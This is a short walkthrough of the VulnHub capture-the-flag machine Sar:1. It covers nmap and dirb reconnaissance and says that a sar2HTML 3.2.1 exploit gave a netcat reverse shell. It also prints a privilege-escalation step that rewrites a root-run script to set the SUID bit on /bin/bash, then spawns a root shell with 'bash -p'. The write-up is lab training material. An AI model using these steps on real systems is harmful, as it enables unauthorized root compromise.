

# Sar:1 Walkthrough 

**VulnHub Link:** [Sar:1](https://www.vulnhub.com/entry/sar-1,425/)
**Difficulty:** Easy
**Release Date:** 15 Feb 2020

## 1.Reconnaissance
```bash
nmap -A -O -T4 -P -sV 192.168.100.131
```


## 2.Web Enumeration

```bash
dirb http://ip
```

sar2HTML found in robots.txt and http://<ip>/sar2HTML

## 3. Exploitation

sar2HTML 3.2.1 exploit found and gaining reverse shell with netcat

love user found

user flag captured

## 4.Privilege Escalation

finally.sh --> write.sh
```bash
echo '#!/bin/bash
chmod +s /bin/bash' > write.sh
chmod +x write.sh
```
suid byte has been added to /bin/bash

/bin/bash -p --> escalating to root and root flag captured
